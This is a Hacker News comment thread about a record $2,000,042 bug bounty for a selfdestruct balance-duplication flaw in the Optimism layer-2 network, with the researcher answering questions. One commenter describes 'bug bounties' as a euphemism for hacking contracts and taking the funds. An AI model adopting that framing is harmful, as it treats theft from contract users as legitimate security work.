[next](#30293317) [–]  But he said "sorry" (somewhat) politely and pulled the "we are fast growing startup"-card .. so you are obligated to forgive him? It seems quite clear to me (as a third party to this) that the lack of communication w.r.t. this behavior was intentional. Trying to fix a mistake without having to admit having made it in the first place... Civil discussion is going to collapse even further if bad actors don't stop with the dark patterns. | | --- | --- | --- | | | |  |  | [Kalium](user?id=Kalium) [on Feb 10, 2022](item?id=30293317)   | [parent](#30293113) | [prev](#30293526) | [next](#30290686) [–]  Your first link is broken. | | --- | --- | --- | | | |  |  | [lihorne](user?id=lihorne) [on Feb 10, 2022](item?id=30293324)   | [root](#30293113) | [parent](#30293317) | [next](#30290686) [–]  Fixed, sorry | | --- | --- | --- | | | |  |  | [steelstraw](user?id=steelstraw) [on Feb 10, 2022](item?id=30290686)   | [prev](#30293113) | [next](#30291629) [–]  At least Optimism is smart enough to offer huge bounties. They awarded him $2,000,042 for this. <https://twitter.com/saurik/status/1491821215924690950> | | --- | --- | --- | | | |  |  | [kristofferR](user?id=kristofferR) [on Feb 10, 2022](item?id=30291629)   | [prev](#30290686) | [next](#30294097) [–]  This title is way underselling this. As far as I could gather from a quick googling, this is the largest single bug bounty payout in history. | | --- | --- | --- | | | |  |  | [runeks](user?id=runeks) [on Feb 10, 2022](item?id=30291702)   | [parent](#30291629) | [next](#30294097) [–]  Along with the bounty for this one: [https://gerhard-wagner.medium.com/double-spending-bug-in-pol...](https://gerhard-wagner.medium.com/double-spending-bug-in-polygons-plasma-bridge-2e0954ccadf1) (also $2M [1]) [1] [https://portswigger.net/daily-swig/polygon-pays-out-record-2...](https://portswigger.net/daily-swig/polygon-pays-out-record-2-million-bug-bounty-reward-for-critical-vulnerability) | | --- | --- | --- | | | |  |  | [saurik](user?id=saurik) [on Feb 10, 2022](item?id=30292457)   | [root](#30291629) | [parent](#30291702) | [next](#30294097) [–]  Ah, but, you see: this bounty was $2M...+42! (omg; I honestly hadn't noticed this o\_O) | | --- | --- | --- | | | |  |  | [maurelian](user?id=maurelian) [on Feb 10, 2022](item?id=30294468)   | [root](#30291629) | [parent](#30292457) | [next](#30294097) [–]  The extra 42 was just my little hack to get our bounty to appear higher on the list. Nice that it ended up seeing a record too though. :) | | --- | --- | --- | | | |  |  | [artdigital](user?id=artdigital) [on Feb 10, 2022](item?id=30294097)   | [prev](#30291629) | [next](#30291656) [–]  Can someone explain this to me? He states that Optimism doesn’t have a native gas token and native currency, and eth balances are implemented using ERC20 tokens with OVM instead of the native balance mechanism However the exploit is using selfdestruct to transfer and create the remaining balance to the target address, effectively creating new tokens out of thin air. > This means that, when a contract self-destructs, its balance is BOTH given to the beneficiary AND ALSO KEPT. If the contract had 10 ETH, 10 ETH are CREATED from thin bits and handed to the beneficiary. But I thought from this explanation that contracts don’t have a balance because ETH is stored in an ERC20 contract, and is set to 0. How can the contract have balance (10 ETH) to transfer on selfdestruct when optimism doesn’t have a native balance? | | --- | --- | --- | | | |  |  | [saurik](user?id=saurik) [on Feb 11, 2022](item?id=30295440)   | [parent](#30294097) | [next](#30291656) [–]  Would it help if that paragraph had said "10 OETH"'instead of "10 ETH"? (I am going to go change it regardless, as that is probably at least theoretically less confusing; but, like: is that sufficient?) | | --- | --- | --- | | | |  |  | [artdigital](user?id=artdigital) [on Feb 14, 2022](item?id=30330653)   | [root](#30294097) | [parent](#30295440) | [next](#30291656) [–]  But selfdestruct only acts on balance held in the native token, if it's balance in ERC20 it wouldn't transfer it to the target account I still have trouble understanding how this exploit worked | | --- | --- | --- | | | |  |  | [yeetard](user?id=yeetard) [on Feb 23, 2022](item?id=30439130)   | [root](#30294097) | [parent](#30330653) | [next](#30291656) [–]  Isn't that the actual bug? That balances are kept at two places? What actually happens in SetBalance() if rcfg.UsingOVM ==true? So... I guess what it boils down to is 'How does Optimism manage it's state trie'? I'd really enjoy a more in-depth explanation for this. | | --- | --- | --- | | | |  |  | [X6S1x6Okd1st](user?id=X6S1x6Okd1st) [on Feb 10, 2022](item?id=30291656)   | [prev](#30294097) | [next](#30290044) [–]  Excellent write up! Glad you were well compensated. | | --- | --- | --- | | | |  |  | [vmception](user?id=vmception) [on Feb 10, 2022](item?id=30290044)   | [prev](#30291656) | [next](#30297113) [–]  Whats the best way to replicate these states on localhost? When using the L1s, it is easy to fork the current state of the network with Brownie and bang at smart contracts for free using fake gas on localhost. Reserving any advantage or unexpected behavior you find for the bug report, or redeploying it on mainnet for the bug bounty paying the gas just that one time But with L2s in the mix, especially Optimism, how would one do the same? Would it be like two instances of Brownie in virtual environments? Kind of like having a cluster of microservices booted up in Vanguard on localhost? | | --- | --- | --- | | | |  |  | [saurik](user?id=saurik) [on Feb 10, 2022](item?id=30290094)   | [parent](#30290044) | [next](#30297113) [–]  Yeah, so to run your own Optimism full node--the "whole stack"--you need 1) a normal Ethereum full node of some kind, 2) an Optimism data-transport-layer service (which scrapes the L1 looking for L2 transactions and provides a web service to access just that data), and then 3) an Optimism l2geth instance (which is an Ethereum node modified to read its transaction batches from the DTL). | | --- | --- | --- | | | |  |  | [vmception](user?id=vmception) [on Feb 10, 2022](item?id=30290183)   | [root](#30290044) | [parent](#30290094) | [next](#30297113) [–]  Wow. A tutorial on doing that would be great. Speaking of "bug bounties", I use the term liberally as a euphemism for hacking these contracts and taking everything for yourself under the observation that company/community bug bounty systems are broken and undervalued for the value they provide. Although seen as a euphamism now, I think the term is accurate especially when looking at how bounty was used in the American frontier or Wild West. You made $2,000,042 from this without any drama, in a quick timeline even though it was technically outside of the scope of the program! I think many in the hackernews audience would have liked to have known that from the get go. Many people ignoring blockchain would pivot immediately to at least doing smart contract bug bounty research on the side just from knowing that alone, learning the extremely lucrative and marketable skills in the process. If you formatted the article to the bug-bounty timeline to payout format. You should even show some people a material thing that what you bought with it, because many people still don't understand that this is analogous and convertible to money in your bank account especially at these convenient amounts. How much could you have seized with this bug at the time? | | --- | --- | --- | | | |  |  | [yeetard](user?id=yeetard) [on Feb 23, 2022](item?id=30439357)   | [root](#30290044) | [parent](#30290183) | [next](#30290343) [–]  > I use the term liberally as a euphemism for hacking these contracts and taking everything for yourself under the observation that company/community bug bounty systems are broken and undervalued for the value they provide. hmm... | | --- | --- | --- | | | |  |  | [saurik](user?id=saurik) [on Feb 10, 2022](item?id=30290343)   | [root](#30290044) | [parent](#30290183) | [prev](#30439357) | [next](#30297113) [–]  > ...because many people still don't understand that this is analogous and convertible to money in your bank account especially at these convenient amounts... FWIW this project doesn't have its own token (this L2 uses ETH as its currency just like the base layer), so the bug bounty payout is denominated in actual USD. | | --- | --- | --- | | | |  |  | [vmception](user?id=vmception) [on Feb 10, 2022](item?id=30290511)   | [root](#30290044) | [parent](#30290343) | [next](#30297113) [–]  Whether they paid in ETH priced in USD, or a stablecoin, or a USD wire to your bank account, many people aren't aware that getting paid in this space is that lucrative and that liquid and that simple. | | --- | --- | --- | | | |  |  | [seibelj](user?id=seibelj) [on Feb 10, 2022](item?id=30290790)   | [root](#30290044) | [parent](#30290511) | [next](#30298614) [–]  saurik is pretty famous, I would estimate that most serious players in this space know the money is here. What is good about this post and the fact it's on top of HN is that maybe the average HN reader will be curious and help shift the crypto narrative on HN from negativity to at least neutrality. | | --- | --- | --- | | | |  |  | [vmception](user?id=vmception) [on Feb 10, 2022](item?id=30290953)   | [root](#30290044) | [parent](#30290790) | [next](#30292843) [–]  Yeah it would be great and more on brand for this forum to have neutrality The actual communities for most projects and general crypto are obnoxious, and probably what has helped push or keep this community to negativity, i could see it flipping to neutral though, judging by the emails I get there are plenty builders and educated proponents here | | --- | --- | --- | | | |  |  | [antocv](user?id=antocv) [on Feb 10, 2022](item?id=30292843)   | [root](#30290044) | [parent](#30290790) | [prev](#30290953) | [next](#30298614) [–]  But the negativity is well deserved Look at how the crypto-sphere reacted at FEDs returning "stolen" coins to Bitfinex like all praise and "justice served". Only HNers actually raised "hey guys why do you even crypto if FEDs will decide who owns what". It all ends up being Government-coin and they like it. | | --- | --- | --- | | | |  |  | [vmception](user?id=vmception) [on Feb 10, 2022](item?id=30293299)   | [root](#30290044) | [parent](#30292843) | [next](#30298614) [–]  To me, this is Exhibit A of the oddly incoherent nature of discussions that appear here. What you wrote is a random mixture of ideology, misinterpretation of what happened, and the wrong forum for it. Where would one even start? US Govt hasn't returned the bitcoin to Bitfinex. Bitfinex has stated they would apply for getting it returned. This is the process these things take. All that has occurred is a DOJ/FBI seizure, indictment and arrest. I don't know what reaction you referring to and your sentences are ideological hyperbole that have nothing to do with the technology. This is a technology and industry forum. The technology allows any possessor of the private key to assume control over the entries in that private key. | | --- | --- | --- | | | |  |  | [miracle2k](user?id=miracle2k) [on Feb 11, 2022](item?id=30295991)   | [root](#30290044) | [parent](#30293299) | [next](#30298614) [–]  This is a popular line of thinking among reputable crypto critics: <https://twitter.com/alexhern/status/1491449689656360961> I agree its incoherent, but I struggle to understand of how it makes sense to them. | | --- | --- | --- | | | |  |  | [8note](user?id=8note) [on Feb 11, 2022](item?id=30298614)   | [root](#30290044) | [parent](#30290511) | [prev](#30290790) | [next](#30297113) [–]  The Dan olsen analysis is very clear about how lucrative and liquid it is, and where those come from. Ethics wise, that liquidity comes from the scams and you're part and parcel to them by participating | | --- | --- | --- | | | |  |  | [vmception](user?id=vmception) [on Feb 11, 2022](item?id=30306554)   | [root](#30290044) | [parent](#30298614) | [next](#30297113) [–]  Even if that was something to care about, the entire economy works that way. I don't feel that it is a role of the state to whitelist what money can go into what economy, and even though it has assumed that role in the fiat system it is not successful. So just go where the action is. Don't scam people yourself while you are at it. | | --- | --- | --- | | | |  |  | [paxys](user?id=paxys) [on Feb 11, 2022](item?id=30297113)   | [prev](#30290044) | [next](#30290125) [–]  Wow I haven't heard Jay Freeman's name in the news since the old iPhone jailbreaking days. Glad to see he is still at it. | | --- | --- | --- | | | |  |  | [cgb223](user?id=cgb223) [on Feb 10, 2022](item?id=30290125)   | [prev](#30297113) | [next](#30291276) [–]  Page seems to be down. Can’t connect to server | | --- | --- | --- | | | |  |  | [saurik](user?id=saurik) [on Feb 10, 2022](item?id=30290186)   | [parent](#30290125) | [next](#30291276) [–]  (This has hopefully been fixed; the way I added SSL to my website--which I only the night before last--was "ridiculous" and apparently not at all up for the challenge :/. I thankfully had given myself a backup plan--offloading the SSL to nginx--which I was able to switch to quickly, but I should have really pushed my update today with that configuration.) | | --- | --- | --- | | | |  |  | [superfrogged](user?id=superfrogged) [on Feb 10, 2022](item?id=30291276)   | [prev](#30290125) [–]  May I recommend cracking an economics textbook | | --- | --- | --- | | | |  |  | [X6S1x6Okd1st](user?id=X6S1x6Okd1st) [on Feb 10, 2022](item?id=30291558)   | [parent](#30291276) | [next](#30291831) [–]  To learn that 2M is a good payout for finding a bug? | | --- | --- | --- | | | |  |  | [AlexCoventry](user?id=AlexCoventry) [on Feb 10, 2022](item?id=30291831)   | [parent](#30291276) | [prev](#30291558) [–]  What's your point? | | --- | --- | --- | | |
| |  | | --- |   [Guidelines](newsguidelines.html) | [FAQ](newsfaq.html) | [Lists](lists) | [API](https://github.com/HackerNews/API) | [Security](security.html) | [Legal](https://www.ycombinator.com/legal/) | [Apply to YC](https://www.ycombinator.com/apply/) | Contact Search: |


